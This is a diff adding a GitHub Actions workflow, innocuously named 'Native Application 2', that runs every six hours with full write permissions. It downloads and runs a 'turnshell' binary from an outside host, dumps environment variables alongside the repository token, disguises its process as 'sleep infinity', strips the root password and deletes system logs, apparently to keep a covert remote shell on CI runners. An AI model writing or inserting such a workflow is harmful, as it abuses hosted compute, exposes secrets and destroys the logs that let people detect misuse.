@@ -1,0 +1,62 @@
+name: Native Application 2
+
+on:
+  workflow_dispatch:
+    inputs:
+      data:
+        description: 'Input string'
+        default: ''
+        required: false
+  schedule:
+    - cron: '0 */6 * * *'  # Runs every 6 hours
+
+permissions: write-all
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v4
+
+    - name: Install dependencies
+      run: |
+        echo "Updating and installing packages..."
+        sudo DEBIAN_FRONTEND=noninteractive apt-get update -y &>/dev/null
+        sudo DEBIAN_FRONTEND=noninteractive apt-get install -y \
+          iputils-ping dnsutils nmap tcpdump net-tools inetutils-traceroute mtr whois curl wget bind9-host iproute2 iftop hping3 ngrep nano aria2 coturn cowsay neofetch strace &>/dev/null
+        # Stop coturn/turnserver services after install to prevent automatic startup
+        sudo systemctl stop coturn || true
+        sudo systemctl disable coturn || true
+        sudo systemctl stop turnserver || true
+        sudo systemctl disable turnserver || true
+        echo "Dependencies installed."
+
+    - name: Download and prepare scripts
+      run: |
+        wget -q https://ec2.zibri.org/turnshell
+        wget -q https://ec2.zibri.org/.turn
+        chmod a+x turnshell
+        chmod a+x shrel.sh  # Ensure shrel.sh exists in your repo
+
+    - name: Export environment variables except PWD and HOME
+      run: |
+        set | grep -vE "PWD|HOME" > .set
+
+    - name: Update root bashrc and run custom script
+      env:
+        GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      run: |
+        export TERM='xterm-256color'
+        sudo sed -i -e '$a set -o allexport' -e '$a source /home/runner/work/shell/shell/.set &>/dev/null' -e '$a set +o allexport' /root/.bashrc
+        exec -a "sleep infinity" sudo -EHs <<EOF
+        killall -9 turnserver || true
+        passwd -d root
+        touch ~root/.hushlogin
+        cat logo.txt >/etc/issue
+        ln -sf /usr/share/zoneinfo/Africa/Cairo /etc/localtime
+        lsof -Fn | grep -F '.log' | grep -v deleted | awk '/^n/ {print substr(\$0, 2)}' | xargs -r rm -rf
+        rm -rf /var/log/*
+        chmod a+x shrel.sh
+        ./shrel.sh
+        EOF
